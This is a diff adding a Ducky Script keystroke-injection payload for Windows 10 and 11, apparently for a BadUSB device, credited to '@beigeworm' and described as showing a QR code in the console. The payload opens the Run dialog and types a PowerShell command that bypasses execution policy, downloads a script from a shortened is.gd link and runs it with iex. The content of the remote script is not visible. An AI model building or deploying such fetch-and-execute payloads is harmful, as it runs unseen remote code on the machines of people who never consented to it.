@@ -1,0 +1,16 @@
+
+REM Title: beigeworm's QR code to console.
+REM Author: @beigeworm
+REM Description: Uses Powershell to display a generated QR code from text or a URL
+REM Target: Windows 10 and 11
+
+REM SETUP
+REM Replace https://beigeworm.com with your url ot text string.
+
+DEFAULT_DELAY 100
+
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -Ep Bypass -C $txt = 'https://beigeworm.com'; irm https://is.gd/bwpsqrcode | iex
+ENTER
